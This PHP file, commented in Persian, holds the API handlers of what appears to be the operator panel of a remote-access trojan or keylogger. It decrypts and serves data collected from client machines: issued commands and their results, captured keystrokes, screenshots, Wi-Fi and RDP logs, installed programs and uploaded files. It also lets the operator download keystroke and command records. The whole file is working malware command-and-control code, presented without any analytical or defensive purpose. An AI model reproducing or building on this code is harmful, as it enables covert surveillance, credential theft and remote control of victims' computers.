<?php
// API request handlers for log-viewer.php

function handleAPIRequests($pdo, $logged_in)
{
    // List of all API endpoints
    $apiEndpoints = [
        'get_logs',
        'get_user_data',
        'get_vm_status',
        'get_wifi_logs',
        'get_rdp_logs',
        'get_installed_programs',
        'get_uploaded_files',
        'download_log',
        'download_user_data'
    ];

    $isApiRequest = false;
    foreach ($apiEndpoints as $endpoint) {
        if (isset($_GET[$endpoint])) {
            $isApiRequest = true;
            break;
        }
    }

    if ($isApiRequest && !$logged_in) {
        // Return JSON error for API requests when not authenticated
        header('Content-Type: application/json; charset=utf-8');
        http_response_code(401);
        echo json_encode(['error' => 'Authentication required', 'redirect' => true]);
        exit;
    }

    if (!$logged_in) return;

    // Existing API handling code remains the same...
    if (isset($_GET['get_logs'])) {
        header('Content-Type: application/json; charset=utf-8');
        try {
            $stmt = $pdo->query("
            SELECT id, client_id, command, status, result, created_at, updated_at, completed_at
            FROM client_commands
            ORDER BY created_at DESC LIMIT 100
        ");
            $logs = $stmt->fetchAll();

            foreach ($logs as &$log) {
                $log['raw_result'] = $log['result'];

                // دیباگ برای دیدن داده‌های اصلی
                error_log("Original command: " . $log['command']);
                error_log("Original result: " . ($log['result'] ? substr($log['result'], 0, 100) : 'NULL'));

                // رمزگشایی command
                $decrypted_command = decrypt($log['command'], Config::$ENCRYPTION_KEY);
                error_log("Decrypted command: " . $decrypted_command);
                $log['command'] = $decrypted_command;

                // رمزگشایی result
                if ($log['result']) {
                    $decrypted_result = decrypt($log['result'], Config::$ENCRYPTION_KEY);
                    error_log("Decrypted result: " . substr($decrypted_result, 0, 100));
                    $log['result'] = $decrypted_result;
                } else {
                    $log['result'] = '';
                }
            }

            echo json_encode(['logs' => $logs], JSON_UNESCAPED_UNICODE);
        } catch (PDOException $e) {
            echo json_encode(['error' => 'Failed to fetch logs: ' . $e->getMessage()]);
        }
        exit;
    }

    // Fetch user data
    if (isset($_GET['get_user_data'])) {
        header('Content-Type: application/json; charset=utf-8');
        try {
            $stmt = $pdo->query("
            SELECT id, client_id, keystrokes, system_info, screenshot_path, created_at
            FROM user_data
            ORDER BY created_at DESC LIMIT 100
        ");
            $user_data = $stmt->fetchAll();

            foreach ($user_data as &$data) {
                $data['raw_keystrokes'] = $data['keystrokes'];
                $data['raw_system_info'] = $data['system_info'];
                $data['keystrokes'] = $data['keystrokes'] ? ($data['keystrokes'][0] === '{' ? formatJsonForDownload($data['keystrokes']) : $data['keystrokes']) : '';
                $data['system_info'] = $data['system_info'] ? formatJsonForDownload($data['system_info']) : '';

                // اصلاح آدرس تصاویر
                if ($data['screenshot_path']) {
                    // تبدیل مسیر فایل سیستم به URL وب
                    $base_path = __DIR__ . '/../';
                    $web_path = str_replace($base_path, '', $data['screenshot_path']);
                    $data['screenshot_url'] = $web_path;

                    // اگر مسیر هنوز شامل مسیر کامل سرور است، آن را به مسیر نسبی تبدیل کن
                    if (strpos($data['screenshot_url'], '/home/') === 0) {
                        // پیدا کردن بخش public_html از مسیر
                        $public_html_pos = strpos($data['screenshot_url'], '/public_html/');
                        if ($public_html_pos !== false) {
                            $data['screenshot_url'] = substr($data['screenshot_url'], $public_html_pos + 12); // +12 برای حذف '/public_html/'
                        }
                    }

                    // اطمینان از شروع با /
                    if (strpos($data['screenshot_url'], '/') !== 0) {
                        $data['screenshot_url'] = '/' . $data['screenshot_url'];
                    }
                } else {
                    $data['screenshot_url'] = '';
                }
            }

            echo json_encode(['user_data' => $user_data], JSON_UNESCAPED_UNICODE);
        } catch (PDOException $e) {
            echo json_encode(['error' => 'Failed to fetch user data: ' . $e->getMessage()]);
        }
        exit;
    }


    // Fetch VM status
    if (isset($_GET['get_vm_status'])) {
        header('Content-Type: application/json; charset=utf-8');
        try {
            $stmt = $pdo->query("
                SELECT client_id, vm_details, created_at
                FROM client_vm_status
                ORDER BY created_at DESC LIMIT 100
            ");
            $vm_status = $stmt->fetchAll();

            foreach ($vm_status as &$status) {
                $status['vm_details'] = $status['vm_details'] ? decrypt($status['vm_details'], Config::$ENCRYPTION_KEY) : '';
            }

            echo json_encode(['vm_status' => $vm_status], JSON_UNESCAPED_UNICODE);
        } catch (PDOException $e) {
            echo json_encode(['error' => 'Failed to fetch VM status: ' . $e->getMessage()]);
        }
        exit;
    }

    // Fetch WiFi logs
    if (isset($_GET['get_wifi_logs'])) {
        header('Content-Type: application/json; charset=utf-8');
        try {
            $stmt = $pdo->query("
                SELECT id, client_id, message, created_at
                FROM client_logs
                WHERE log_type = 'wifi'
                ORDER BY created_at DESC LIMIT 100
            ");
            $wifi_logs = $stmt->fetchAll();

            foreach ($wifi_logs as &$log) {
                $log['message'] = $log['message'] ? decrypt($log['message'], Config::$ENCRYPTION_KEY) : '';
            }

            echo json_encode(['wifi_logs' => $wifi_logs], JSON_UNESCAPED_UNICODE);
        } catch (PDOException $e) {
            echo json_encode(['error' => 'Failed to fetch Wi-Fi logs: ' . $e->getMessage()]);
        }
        exit;
    }

    // Fetch RDP logs
    if (isset($_GET['get_rdp_logs'])) {
        header('Content-Type: application/json; charset=utf-8');
        try {
            $stmt = $pdo->query("
                SELECT id, client_id, message, created_at
                FROM client_logs
                WHERE log_type = 'rdp'
                ORDER BY created_at DESC LIMIT 100
            ");
            $rdp_logs = $stmt->fetchAll();

            foreach ($rdp_logs as &$log) {
                $log['message'] = $log['message'] ? decrypt($log['message'], Config::$ENCRYPTION_KEY) : '';
            }

            echo json_encode(['rdp_logs' => $rdp_logs], JSON_UNESCAPED_UNICODE);
        } catch (PDOException $e) {
            echo json_encode(['error' => 'Failed to fetch RDP logs: ' . $e->getMessage()]);
        }
        exit;
    }

    // Fetch installed programs
    if (isset($_GET['get_installed_programs'])) {
        header('Content-Type: application/json; charset=utf-8');
        try {
            $stmt = $pdo->query("
                SELECT id, client_id, program_data, created_at
                FROM client_installed_programs
                ORDER BY created_at DESC LIMIT 100
            ");
            $programs = $stmt->fetchAll();

            foreach ($programs as &$program) {
                $program['program_data'] = $program['program_data'] ? decrypt($program['program_data'], Config::$ENCRYPTION_KEY) : '';
            }

            echo json_encode(['installed_programs' => $programs], JSON_UNESCAPED_UNICODE);
        } catch (PDOException $e) {
            echo json_encode(['error' => 'Failed to fetch installed programs: ' . $e->getMessage()]);
        }
        exit;
    }

    // Fetch uploaded files
    if (isset($_GET['get_uploaded_files'])) {
        header('Content-Type: application/json; charset=utf-8');
        try {
            $stmt = $pdo->query("
                SELECT id, client_id, filename, file_path AS message, created_at
                FROM client_files
                ORDER BY created_at DESC LIMIT 100
            ");
            $file_logs = $stmt->fetchAll();

            foreach ($file_logs as &$log) {
                $log['message'] = $log['message'] ? decrypt($log['message'], Config::$ENCRYPTION_KEY) : '';
                $log['file_data'] = ['filename' => $log['filename'], 'file_path' => $log['message']];

                if ($log['message']) {
                    $log['file_url'] = str_replace(__DIR__ . '/../', '', $log['message']);
                } else {
                    $log['file_url'] = '';
                }
            }

            echo json_encode(['file_logs' => $file_logs], JSON_UNESCAPED_UNICODE);
        } catch (PDOException $e) {
            echo json_encode(['error' => 'Failed to fetch uploaded files: ' . $e->getMessage()]);
        }
        exit;
    }

    // Download log
    if (isset($_GET['download_log']) && isset($_GET['log_id'])) {
        try {
            $log_id = filter_var($_GET['log_id'], FILTER_VALIDATE_INT);
            if ($log_id === false) {
                die("Invalid log ID");
            }

            $stmt = $pdo->prepare("
                SELECT client_id, command, status, result, created_at, completed_at
                FROM client_commands
                WHERE id = ?
            ");
            $stmt->execute([$log_id]);
            $log = $stmt->fetch();

            if (!$log) {
                die("Log not found");
            }

            $log['command'] = decrypt($log['command'], Config::$ENCRYPTION_KEY);
            $log['result'] = $log['result'] ? decrypt($log['result'], Config::$ENCRYPTION_KEY) : 'No result';

            $content = "Client ID: {$log['client_id']}\n";
            $content .= "Command: {$log['command']}\n";
            $content .= "Status: {$log['status']}\n";
            $content .= "Result:\n";
            $content .= formatJsonForDownload($log['result']) . "\n";
            $content .= "Created At: {$log['created_at']}\n";
            $content .= "Completed At: " . ($log['completed_at'] ? $log['completed_at'] : 'N/A') . "\n";

            header('Content-Type: text/plain; charset=utf-8');
            header('Content-Disposition: attachment; filename="log_' . $log_id . '.txt"');
            header('Content-Length: ' . strlen($content));
            echo $content;
            exit;
        } catch (PDOException $e) {
            die("Failed to download log");
        }
    }

    // Download user data
    if (isset($_GET['download_user_data']) && isset($_GET['data_id'])) {
        try {
            $data_id = filter_var($_GET['data_id'], FILTER_VALIDATE_INT);
            if ($data_id === false) {
                die("Invalid data ID");
            }

            $stmt = $pdo->prepare("
                SELECT client_id, keystrokes, system_info, screenshot_path, created_at
                FROM user_data
                WHERE id = ?
            ");
            $stmt->execute([$data_id]);
            $data = $stmt->fetch();

            if (!$data) {
                die("Data not found");
            }

            $content = "Client ID: {$data['client_id']}\n";
            $content .= "Keystrokes:\n" . ($data['keystrokes'] ? formatJsonForDownload($data['keystrokes']) : 'No keystrokes') . "\n";
            $content .= "System Info:\n" . ($data['system_info'] ? formatJsonForDownload($data['system_info']) : 'No system info') . "\n";
            $content .= "Screenshot: " . ($data['screenshot_path'] ? $data['screenshot_path'] : 'No screenshot') . "\n";
            $content .= "Created At: {$data['created_at']}\n";

            header('Content-Type: text/plain; charset=utf-8');
            header('Content-Disposition: attachment; filename="user_data_' . $data_id . '.txt"');
            header('Content-Length: ' . strlen($content));
            echo $content;
            exit;
        } catch (PDOException $e) {
            die("Failed to download user data");
        }
    }
}
